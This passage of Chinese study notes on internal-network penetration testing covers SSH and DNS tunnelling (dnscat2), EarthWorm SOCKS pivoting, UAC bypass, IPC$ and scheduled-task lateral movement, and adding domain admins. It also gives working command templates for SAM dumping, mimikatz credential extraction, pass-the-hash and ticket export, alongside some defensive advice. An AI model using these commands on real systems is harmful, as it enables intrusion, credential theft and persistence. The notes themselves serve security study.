<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash</span><br>ssh -CfNg -L &lt;vps端口&gt;:&lt;靶机ip&gt;:&lt;靶机端口&gt; &lt;跳板机用户&gt;@&lt;跳板机ip&gt; 	 # 此处跳板机通常为内网的Web服务器，下同<br></code></pre></td></tr></table></figure>
<blockquote>
<p>相关参数：</p>
<p>-C： 压缩传输，提高传输速度<br>
-f： 将SSH传输转入后台执行，不占用当前的Shell<br>
-N： 建立静默连接（建立了连接，但是看不到具体会话)<br>
-g： 允许远程主机连接本地用于转发的端口<br>
-L： 本地端口转发<br>
-R： 远程端口转发<br>
-D： 动态转发（SOCKS代理）<br>
-P： 指定SSH端口</p>
</blockquote>
<h5 id="远程转发">远程转发</h5>
<p>用于外部vps不能访问内网的服务器，但内网可以访问外网vps</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash</span><br>ssh -CfNg -R &lt;vps端口&gt;:&lt;靶机ip&gt;:&lt;靶机端口&gt; &lt;vps用户&gt;@&lt;vpsIP地址&gt;	# 内网的Web服务器上运行<br></code></pre></td></tr></table></figure>
<h5 id="动态转发">动态转发</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash</span><br>ssh -CfNg -D &lt;端口&gt; &lt;跳板机用户&gt;@&lt;跳板机ip&gt;	# VPS上运行<br></code></pre></td></tr></table></figure>
<h5 id="防范思路">防范思路</h5>
<ul>
<li>SSH隧道之所以能被攻击者利用，主要是因为系统<strong>访问控制措施不够</strong></li>
<li>在系统中配置<strong>SSH远程管理白名单</strong></li>
<li>在<strong>ACL</strong>中限制只有<strong>特定的IP地址</strong>才能连接SSH</li>
<li>设置系统完全使用<strong>带外</strong>管理</li>
</ul>
<h4 id="DNS协议-2">DNS协议</h4>
<h5 id="dnscat2">dnscat2</h5>
<p>一款使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份认证的开源软件是一个命令与控制工具，客户端采用 C，服务端采用 Ruby</p>
<p>**特点：**支持多个会话、流量加密、使用密钥防止MiTM攻击、在内存中直接执行PowerShell脚本、隐蔽通信。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash</span><br><span class="hljs-meta">#</span><span class="bash"> 服务端</span><br>dnscat2-server # 启动服务器<br><span class="hljs-meta">#</span><span class="bash"> 客户端</span><br>./dnscat --dns server=&lt;服务器ip&gt;,port=&lt;服务器端口&gt; --secret=&lt;服务器密钥&gt;<br></code></pre></td></tr></table></figure>
<p>防范方式：</p>
<ul>
<li>禁止网络中的任何人向外部服务器发送DNS请求，<strong>只允许</strong>与受信任的DNS服务器通信</li>
<li>将邮件服务器/网关列入<strong>白名单</strong>并<strong>阻止</strong>传入和传出流量中的TXT请求</li>
<li>跟踪用户的DNS<strong>査询次数</strong>。如果达到阈值，就生成相应的报告</li>
<li><strong>阻止ICMP</strong></li>
</ul>
<h2 id="3-5">3.5</h2>
<h3 id="SOCKS代理">SOCKS代理</h3>
<h4 id="特点">特点</h4>
<p>SOCK4只支持TCP协议，SOCK5支持TCP/UDP协议于身份验证机制</p>
<p>标准端口为1080，能够直接与靶机进行通信，避免多次端口转发</p>
<h3 id="EarthWorm">EarthWorm</h3>
<p>EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</p>
<h4 id="参数">参数</h4>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-l 为服务启动打开一个端口</span><br><span class="hljs-deletion">-d 设置反连主机地址</span><br><span class="hljs-deletion">-e 设置反连端口</span><br><span class="hljs-deletion">-f 设置连接主机地址</span><br><span class="hljs-deletion">-g 设置连接端口</span><br><span class="hljs-deletion">-t 设置超时的毫秒数。默认值值为1000</span><br><span class="hljs-deletion">-s 状态设置功能</span><br></code></pre></td></tr></table></figure>
<p>其中链路状态有六种，使用<code>-s</code>进行设置：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssocksd</span>  用于正向代理<br>rcsocks rssocks  用于反向代理<br>lcx_slave lcx_tran lcx_listen  复杂网络的多级级联<br></code></pre></td></tr></table></figure>
<h4 id="正向服务器">正向服务器</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell、bash</span><br>ew -s ssocksd -l &lt;端口号&gt;<br></code></pre></td></tr></table></figure>
<p>架设端口号的一个SOCKS代理</p>
<p><img src="https://s2.loli.net/2024/06/11/JGO45it8p9CZXVF.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>在失陷主机上运行，Kali便可以通过<code>1.1.1.1:8888</code>来获取对应<code>1.1.1.1</code>主机提供的代理</p>
<h4 id="反向服务器">反向服务器</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell、bash</span><br>ew -s rcsocks -l &lt;接收端口&gt; -e &lt;转发端口&gt;  # VPS上运行<br>ew -s rssocks -d &lt;VPS IP&gt; -e &lt;转发端口&gt;  # 失陷主机上运行<br></code></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/06/11/IF2PAg7L3BVz8yd.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>此时Kali可通过访问 <code>1.1.1.1:1080</code> 端口使用 rssocks 主机提供的 socks5 代理服务</p>
<h4 id="二重网络环境搭建-A">二重网络环境搭建-A</h4>
<p>获得目标网络内两台主机 A、B 的权限，情况描述如下：</p>
<p>A 主机： 存在公网 IP，且自由监听任意端口，无法访问特定资源</p>
<p>B 主机： 目标网络内部主机，可访问特定资源，<strong>但无法访问公网</strong></p>
<p>A 主机可直连 B 主机</p>
<p><img src="https://s2.loli.net/2024/06/11/ufe593wS7msBRhl.png" srcset="/img/loading.gif" lazyload alt=""></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell、bash</span><br><span class="hljs-meta">#</span><span class="bash"> A主机</span><br>ew -s lcx_tran -l &lt;目标端口&gt; -f &lt;b主机ip&gt; -g &lt;转发端口&gt;<br><span class="hljs-meta">#</span><span class="bash"> B主机</span><br>ew -s ssocksd -l &lt;转发端口&gt;<br></code></pre></td></tr></table></figure>
<h4 id="二重网络环境搭建-B">二重网络环境搭建-B</h4>
<p>获得目标网络内两台主机 A、B 的权限，情况描述如下：</p>
<p>A 主机： 目标网络的边界主机，无公网 IP，无法访问特定资源。</p>
<p>B 主机： 目标网络内部主机，可访问特定资源，却无法回连公网。</p>
<p>A 主机可直连 B 主机，需要一台公网vps</p>
<p><img src="https://s2.loli.net/2024/06/11/iy9zf3PqxLC1Hmp.png" srcset="/img/loading.gif" lazyload alt=""></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell、bash</span><br><span class="hljs-meta">#</span><span class="bash"> vps</span><br>ew -s lcx_listen -l &lt;接收端口&gt; -e &lt;转发端口1&gt; <br><span class="hljs-meta">#</span><span class="bash"> A主机</span><br>ew -s lcx_slave -d  -e &lt;转发端口1&gt; -f  -g &lt;转发端口2&gt;<br><span class="hljs-meta">#</span><span class="bash"> B主机</span><br>ew -s ssocksd -l &lt;转发端口2&gt;<br></code></pre></td></tr></table></figure>
<p>kali 可通过访问 <code>1.1.1.1:1080</code> 来使用 <code>2.2.2.3</code> 主机提供的 socks5 代理</p>
<h3 id="ProxyChains">ProxyChains</h3>
<h4 id="修改配置">修改配置</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash</span><br>vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure>
<h4 id="测试代理">测试代理</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash</span><br>proxyresolv &lt;域名&gt;<br></code></pre></td></tr></table></figure>
<h4 id="启动代理浏览器">启动代理浏览器</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash</span><br>proxychains firefox<br></code></pre></td></tr></table></figure>
<h1>第四章</h1>
<h2 id="4-1">4.1</h2>
<h3 id="Windows中的四种权限">Windows中的四种权限</h3>
<ul>
<li>User：普通用户权限，是系统中最安全的权限（因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料)</li>
<li>Administrator：管理员权限。如果没有管理员权限，就无法进行获取散列值、安装软件、修改防 火墙规则、修改注册表等操作</li>
<li>System：系统权限。可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到 System权限才可以对散列值进行Dump操作</li>
<li>TrustedInstaller：Windows中的最高权限。对系统文件，即使拥有System权限也无法进行修改。只有拥有TrustedInstaller权限的用户才可以修改系统文件</li>
</ul>
<h3 id="系统内核溢出漏洞提权分析以及防范（了解）">系统内核溢出漏洞提权分析以及防范（了解）</h3>
<p>使用<code>Metasploit</code>发现对应缺失补丁</p>
<p><code>Windows Exploit Suggester</code>将系统已安装补丁和微软抖动数据库比较，识别可能导致权限提升的漏洞</p>
<p>Powershell中的<code>Sherlock</code>脚本查找用于本地权限提升的漏洞</p>
<h2 id="4-2">4.2</h2>
<h3 id="Windows-操作系统配置错误利用分析及防范">Windows 操作系统配置错误利用分析及防范</h3>
<h4 id="服务文件特点">服务文件特点</h4>
<p>Windows系统服务文件在操作<strong>系统启动时</strong>加载和执行，并在<strong>后台调用</strong>可执行文件</p>
<p>Windows服务以<strong>System权限</strong>运行，因此其文件夹，文件和注册表键值都是<strong>受强访问机制保护</strong>的</p>
<h4 id="Windows-Installer">Windows Installer</h4>
<p>Windows Installer是indows操作系统的组件之一，用于管理和配置软件服务</p>
<p>其分为客户端安装服务（Msiexec.exe）和MSI文件两部分，MSI文件是Windows Installer的数据包 Windows Installer 通过 Msiexec.exe 安装MSI文件包含的程序</p>
<h2 id="4-3">4.3</h2>
<h3 id="组策略首选项提权分析及防范">组策略首选项提权分析及防范</h3>
<ul>
<li>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制</li>
<li>SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控 制器需要的域信息等</li>
<li>整个SYSVOL目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在<code>C:\Windows\SYSVOL\DOMAIN\Policies\</code>目录中。</li>
</ul>
<h2 id="4-4">4.4</h2>
<h3 id="绕过UAC提权分析及防范">绕过UAC提权分析及防范</h3>
<p>UAC(UserAccountControl，用户账户控制)是微软为提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码</p>
<p>需要UAC的操作：</p>
<ul>
<li>配置Windows Update</li>
<li>增加/删除账户</li>
<li>更改账户类型</li>
<li>更改UAC的设置</li>
<li>安装ActiveX</li>
<li>安装/卸载程序</li>
<li>安装设备驱动程序</li>
<li>将文件移动/复制到<code>ProgramFiles</code>或<code>Windows</code>目录下</li>
<li>査看其他用户的文件夹</li>
</ul>
<h3 id="Bypassuac">Bypassuac</h3>
<p>在经过前期一系列的渗透测试后，拿到目标机器的<code>meterpreter Shell</code>后此时为普通用户权限，现在需要尝试获取System权限</p>
<p>使用msf的<code>exploit/windows/local/bypassuac</code>模块来进行获取一个新的<code>meterpreter Shell</code>，之后执行<code>getsystem</code>命令，可以看到绕过了UAC，获取到了System权限</p>
<h2 id="4-5">4.5</h2>
<h3 id="令牌窃取分析及防范">令牌窃取分析及防范</h3>
<p>令牌（Token)是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的</p>
<p>**特点：**随机性和不可预测性。一般的攻击者或软件都无法将令牌猜测出来</p>
<p>伪造令牌的核心是<code>Kerberos</code>协议</p>
<h4 id="Kerberos协议">Kerberos协议</h4>
<blockquote>
<p>个人觉得这个博客讲的非常好，建议看这个学习而不是看书：<a target="_blank" rel="noopener" href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">详解kerberos认证原理 | Hero (seevae.github.io)</a></p>
</blockquote>
<img src="https://seevae.github.io/img/kerberos6.jpg" srcset="/img/loading.gif" lazyload style="zoom: 67%;" />
<p>其中的三个角色：</p>
<ul>
<li><strong>客户端（client）</strong>：发送请求的一方</li>
<li><strong>服务端（Server）</strong>：接收请求的一方</li>
<li>**密钥分发中心（Key Distribution Center，KDC）**而密钥分发中心一般又分为两部分，分别是：
<ul>
<li><strong>AS（Authentication Server）</strong>：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（Ticket Granting Ticket 票据授予票据）</li>
<li><strong>TGS（Ticket Granting Server）</strong>：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）</li>
</ul>
</li>
</ul>
<h3 id="添加域管理员">添加域管理员</h3>
<h4 id="添加域用户">添加域用户</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net user &lt;用户名&gt; &lt;密码&gt; /ad /domain<br></code></pre></td></tr></table></figure>
<h4 id="把用户添加到域管理员组">把用户添加到域管理员组</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net group &quot;domain admins&quot; &lt;用户名&gt; /ad /domain<br></code></pre></td></tr></table></figure>
<h4 id="查看域管理员组">查看域管理员组</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net group &quot;domain admins&quot; /domain<br></code></pre></td></tr></table></figure>
<h3 id="防范令牌窃取">防范令牌窃取</h3>
<ul>
<li>及时安装微软推送的补丁</li>
<li>不使用对来路不明的或者有危险的软件</li>
<li>对令牌的时效性进行限制，越敏感的数据，其令牌时效应该越短</li>
<li>对每个操作使用不同的令牌</li>
<li>对于令牌，应采取加密存储及多重验证保护</li>
<li>使用加密链路SSL/TLS传输令牌，以防止被中间人窃听</li>
</ul>
<h2 id="4-6">4.6</h2>
<h3 id="无凭证条件下的权限获取去分析及防范">无凭证条件下的权限获取去分析及防范</h3>
<h4 id="LLMNR">LLMNR</h4>
<p>本地链路多播名称解析（LLMNR）是一种域名系统数据包格式，当局域网中DNS服务器不可用时，DNS客户端使用LLMNR解析本地网段中机器的名称。 Windows从Vista版本开始支持LLMNR，支持IPv6</p>
<h4 id="NetBIOS">NetBIOS</h4>
<p>NetBIOS是一种网络协议，根据NetBIOS协议广播获得计算机名称，并将其解析为相应的IP地址。（不支持IPv6）</p>
<h4 id="Net-NTLM-Hash和NTLM-Hash的区别">Net-NTLM-Hash和NTLM-Hash的区别</h4>
<p><code>NTLM Hash</code>是指Windows操作系统的<code>Security Account Manager</code>中保存的<strong>用户密码散列值</strong>。通常保存在Windows的<strong>SAM文件</strong>或者<strong>NTDS.DIT数据库</strong>中，用于对访问资源的用户进行身份验证。</p>
<p><code>Net-NTLM Hash</code>是指在<strong>网络环境</strong>中经过NTLM认证的散列值。挑战/响应验证中的“响应”就包含Net NTLM Hash。使用Responder抓取的通常就是Net-NTLM Hash</p>
<h1>第五章</h1>
<h2 id="5-1">5.1</h2>
<h3 id="IPC">IPC</h3>
<p>IPC是为了实现进程间通信而开放的命名管道</p>
<h4 id="建立IPC">建立IPC</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net use \\&lt;target ip/hostname&gt;\ipc$ &quot;&lt;Password&gt;&quot; /user:&lt;username&gt;<br></code></pre></td></tr></table></figure>
<h4 id="查看已建立的连接">查看已建立的连接</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net use<br></code></pre></td></tr></table></figure>
<h4 id="删除建立的IPC">删除建立的IPC</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net use \\&lt;target ip/hostname&gt;\ipc$ /del /y<br></code></pre></td></tr></table></figure>
<h4 id="IPC利用条件">IPC利用条件</h4>
<ul>
<li>开启了139、445端口</li>
<li>管理员开启了默认共享</li>
</ul>
<h3 id="使用Windows自带的工具获取远程主机信息">使用Windows自带的工具获取远程主机信息</h3>
<h4 id="dir">dir</h4>
<p>列出远程主机文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>dir \\&lt;target ip&gt;\c$<br></code></pre></td></tr></table></figure>
<h4 id="tasklist">tasklist</h4>
<p>显示远程主机的进程</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>tasklist /S &lt;target ip&gt; /U &lt;username&gt; /P &lt;Password&gt;<br></code></pre></td></tr></table></figure>
<h3 id="计划任务">计划任务</h3>
<h4 id="创建计划任务">创建计划任务</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>schtasks /create /s 192.168.100.192 /tn test /sc onstart /tr c:\calc.bat /ru system /f<br></code></pre></td></tr></table></figure>
<blockquote>
<p>/s：在ip为192.168.100.192的远程系统中<br>
/tn：创建一个名为test的计划任务<br>
/sc：开机时启动<br>
/tr：运行的程序为C盘中的calc.bat<br>
/ru：运行权限为System<br>
/f：如果已经存在同名的任务则强制创建</p>
</blockquote>
<h4 id="运行远程计划任务">运行远程计划任务</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>schtasks /run /s 192.168.100.192 /i /tn &quot;Test&quot; <br></code></pre></td></tr></table></figure>
<blockquote>
<p>/i：指定运行一个已计划的任务之前要等待的空闲时间（上述命令中指代立即执行）</p>
</blockquote>
<h4 id="删除远程计划任务">删除远程计划任务</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>schtasks /delete /s 192.168.100.192 /tn &quot;Test&quot; /f<br></code></pre></td></tr></table></figure>
<blockquote>
<p>/f：强制删除</p>
</blockquote>
<h2 id="5-2">5.2</h2>
<h3 id="LM-Hash-和-NTLM-Hash">LM Hash 和 NTLM Hash</h3>
<p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash,另一部分为NTLM Hash。 结构形如：<code>username:RID:LM-HASH:NT-HASH</code></p>
<p>从vista和2008开始默认禁用LM-HASH</p>
<p>**LM HASH：**DES加密，默认禁用，密码不足14字节采用 0 来补全，明文限定为14位以内</p>
<p>**NTLM HASH：**基于MD4</p>
<blockquote>
<p>个人版从Windows Vista 以后，服务器版从Windows Server2003以后，Windows操作系统的认证方式均为NTLM Hash。</p>
</blockquote>
<h3 id="单机密码抓取与防范">单机密码抓取与防范</h3>
<p>要想在Windows操作系统中抓取散列值或明文密码，必须将权限提升至System</p>
<p>本地用户名、散列值和其他安全验证信息都保存在SAM文件中。路径位于<code>C:\Windows\System32\config</code>，处于被锁定的状态，不允许复制。</p>
<p><code>isass.exe</code>进程用于实现安全策略，可以利用工具将散列值或明文密码从内存中的isass进程或SAM文件导出</p>
<p>SAM文件可以通过PE盘进入文件管理环境赋值，或用VSS等方法直接复制</p>
<h4 id="常见工具">常见工具</h4>
<p>GetPass、PwDump7、QuarksPwDump</p>
<h4 id="通过SAM和System文件抓取密码">通过SAM和System文件抓取密码</h4>
<h5 id="导出SAM文件（需要管理员权限）">导出SAM文件（需要管理员权限）</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>reg save HKLM\SAM sam.hive<br>reg save HKLM\SYSTEM system.hive<br></code></pre></td></tr></table></figure>
<h5 id="mimikatz获取SAM和System文件">mimikatz获取SAM和System文件</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>lsadump::sam /sam:sam.hive /system:system.hive<br></code></pre></td></tr></table></figure>
<p>在此之前需要进行提权</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>privilege::debug	# 提升权限<br>token:elevate	# 将权限提升到System<br></code></pre></td></tr></table></figure>
<h5 id="在线读取散列值">在线读取散列值</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; <br></code></pre></td></tr></table></figure>
<h3 id="HashCat">HashCat</h3>
<p>包括Hashcat，oclHashcat，oclRausscrack</p>
<h4 id="区别">区别</h4>
<ul>
<li>
<p>Hashcat 只支持CPU破解</p>
</li>
<li>
<p>oclHashcat 和 oclGausscrack支持GPU加速破解</p>
</li>
<li>
<p>oclHashcat 分为AMD版和NIVDA版，并且需要安装官方指定版本的显卡驱动程序</p>
</li>
</ul>
<h4 id="参数-2">参数</h4>
<ul>
<li>
<p>-b：测试破解基准速度</p>
</li>
<li>
<p>-m：指定散列值的类型</p>
<blockquote>
<p>部分参数选项</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>hash名</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>MD5</td>
</tr>
<tr>
<td>10</td>
<td>md5($pass.$salt)</td>
</tr>
<tr>
<td>20</td>
<td>md5($salt.$pass)</td>
</tr>
<tr>
<td>30</td>
<td>md5(unicode($pass).$salt)</td>
</tr>
<tr>
<td>40</td>
<td>md5($salt.unicode($pass))</td>
</tr>
<tr>
<td>50</td>
<td>HMAC-MD5 (key)</td>
</tr>
<tr>
<td>60</td>
<td>HMAC-MD5 (key)</td>
</tr>
<tr>
<td>100</td>
<td>SHA1</td>
</tr>
<tr>
<td>110</td>
<td>sha1($pass.$salt)</td>
</tr>
<tr>
<td>120</td>
<td>sha1($salt.$pass)</td>
</tr>
<tr>
<td>130</td>
<td>sha1(unicode($pass).$salt)</td>
</tr>
<tr>
<td>140</td>
<td>sha1($salt.unicode($pass))</td>
</tr>
<tr>
<td>150</td>
<td>HMAC-SHA1 (key)</td>
</tr>
<tr>
<td>160</td>
<td>HMAC-SHA1 (key)</td>
</tr>
</tbody>
</table>
</blockquote>
</li>
<li>
<p>-a：指定破解模式</p>
<blockquote>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>Straight</td>
<td>字典 模式</td>
</tr>
<tr>
<td>1</td>
<td>Combination</td>
<td>组合字典 模式</td>
</tr>
<tr>
<td>2</td>
<td>Toggle-Case</td>
<td>大小写转换 模式</td>
</tr>
<tr>
<td>3</td>
<td>Brute-force</td>
<td>掩码暴力 模式</td>
</tr>
<tr>
<td>4</td>
<td>Permutation</td>
<td>序列 模式</td>
</tr>
<tr>
<td>5</td>
<td>Table-Lookup</td>
<td>查表 模式</td>
</tr>
<tr>
<td>6</td>
<td>Hybrid dict + mask</td>
<td>字典+掩码 模式</td>
</tr>
<tr>
<td>7</td>
<td>Hybrid mask + dict</td>
<td>掩码+字典 模式</td>
</tr>
<tr>
<td>8</td>
<td>Prince</td>
<td>王子 模式</td>
</tr>
</tbody>
</table>
</blockquote>
</li>
</ul>
<h4 id="常用命令">常用命令</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash</span><br>hashcat -a 0 -m &lt;类型代码&gt; &lt;存入散列值的文件&gt; &lt;字典文件&gt; &lt;字典文件2&gt;<br></code></pre></td></tr></table></figure>
<h2 id="5-3">5.3</h2>
<h3 id="哈希传递攻击">哈希传递攻击</h3>
<p>大多数渗透测试人员都听说过哈希传递(Pass The Hash)攻击。该方法通过找到与账户相关的密码散列值(通常是NTLM Hash)来进行攻击。在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登录内网中的其他计算机。</p>
<h3 id="使用NTML-hash进行哈希传递">使用NTML hash进行哈希传递</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:&lt;用户名&gt; /domain:&lt;域名&gt; /ntlm:&lt;散列值&gt;&quot;<br></code></pre></td></tr></table></figure>
<h3 id="AES-256密钥进行哈希传递（需要安装KB2871977）">AES-256密钥进行哈希传递（需要安装KB2871977）</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br><span class="hljs-meta">#</span><span class="bash"> 密钥抓取</span><br>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa:ekeys&quot;<br><span class="hljs-meta">#</span><span class="bash"> 哈希传递</span><br>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:&lt;用户名&gt; /domain:&lt;域名&gt; /aes256:&lt;AES key&gt;&quot;<br></code></pre></td></tr></table></figure>
<h2 id="5-4">5.4</h2>
<h3 id="票据传递攻击分析与防范">票据传递攻击分析与防范</h3>
<p>mimikatz的哈希传递功能需要有本地管理员权限，但是票据传递可以不用管理员权限</p>
<p>票据传递是基于kerberos协议，流程为导出票据-&gt;清空内存中的票据-&gt;将票据导入内存</p>
<h3 id="mimikatz票据传递">mimikatz票据传递</h3>
<h4 id="将内存的票据导出">将内存的票据导出</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>mimikatz &quot;privilige::debug&quot; &quot;sekurlsa::tickets /export&quot;<br></code></pre></td></tr></table></figure>
